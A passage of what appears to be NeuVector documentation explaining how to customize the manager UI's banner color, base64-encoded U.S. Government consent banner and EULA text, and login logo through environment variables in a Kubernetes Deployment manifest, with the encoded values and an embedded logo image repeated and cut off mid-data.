PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,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"/>
  </svg>

   5. Example to customize the UI pages using manifests​  Prerequisites​  Before customizing the UI component, ensure that you have the following:  NeuVector manifest repository: https://github.com/neuvector/manifestsNeuVector installed on your Kubernetes cluster  Steps​  Follow these steps to customize the UI component:  Locate the NeuVector manifests repository in your local environment: https://github.com/neuvector/manifests.Navigate to the manifests/kubernetes directory.Choose the right manifest according to your environment. For example, choose neuvector-containerd-k8s.yaml for a k8s cluster with containerd container runtime.Locate the neuvector-manager-pod deployment section in the manifest file to add the environment variables: CUSTOM_PAGE_HEADER_COLOR: Set the banner color to DarkOrange (#ff8c00).CUSTOM_PAGE_HEADER_CONTENT: Specify the header text using a plain HTML or text, for example &quot;You are accessing a U.S. Government (USG) Information System (IS) that is provided for USG-authorized use only.&quot;, remember to based64 encode it.CUSTOM_EULA_POLICY: Customize the policy content using a plain HTML snippet or text and remember to base64 encode it.CUSTOM_LOGIN_LOGO: Customize the logo with a 300x80 pixel svg file and base64 encode it  --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: neuvector/manager:5.3.2 env: - name: CUSTOM_PAGE_HEADER_COLOR value: &quot;#ff8c00&quot; - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,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